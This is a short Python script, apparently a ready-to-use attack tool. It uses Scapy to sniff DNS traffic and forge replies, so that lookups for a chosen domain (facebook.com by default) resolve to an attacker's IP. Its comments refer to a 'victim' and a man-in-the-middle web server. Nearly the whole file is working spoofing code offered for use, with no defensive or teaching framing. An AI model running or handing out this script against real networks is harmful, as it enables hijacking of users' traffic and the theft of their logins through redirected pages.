from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

# Change this to your victim-facing IP (could be your MITM web server)
FAKE_IP = "192.168.1.100"
TARGET_DOMAIN = "facebook.com"  # you can also use regex or a list


def spoof_dns(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS request (not a reply)
        qname = packet[DNSQR].qname.decode()

        if TARGET_DOMAIN in qname:
            print(f"[+] Spoofing DNS request for {qname.strip()}")

            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=53) / \
                          DNS(
                              id=packet[DNS].id,
                              qr=1, aa=1, qd=packet[DNS].qd,
                              an=DNSRR(rrname=qname, ttl=60, rdata=FAKE_IP)
                          )

            send(spoofed_pkt, verbose=0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS spoof script")
    parser.add_argument("target", help="Victim Domain name Address to spoof")
    parser.add_argument("fake",
                        help="Fake IP to redirect from real domain")
    args = parser.parse_args()
    TARGET_DOMAIN, FAKE_IP = args.target, args.fake

    print("[*] DNS spoofing started. Waiting for DNS requests...")
    sniff(filter="udp port 53", prn=spoof_dns, store=False)
